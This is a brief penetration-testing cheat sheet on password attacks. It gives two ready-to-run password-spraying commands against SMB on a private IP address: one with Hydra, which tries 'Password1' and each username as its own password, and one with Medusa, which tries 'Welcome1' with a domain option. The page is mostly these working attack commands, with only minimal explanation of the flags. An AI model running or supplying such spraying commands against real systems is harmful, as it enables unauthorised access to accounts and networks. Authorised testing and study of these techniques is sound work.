# Password attacks

### Hydra

The below command will perform a password attack using a total of 2 attempts per username in the last. \
\
1\. -p \<password> = password\
2\. -e s = try the username as the password

```
hydra -L Common\ users\ list.txt -p Password1 -e s -V 192.168.95.11 smb
```

### Medusa

The below command will perform 1 password attack against each username in the list.&#x20;

1. \-p \<password> = password

```
medusa -h 192.168.95.11 -U Common\ users\ list.txt -p Welcome1 -M smbnt -m GROUP:DOMAIN
```

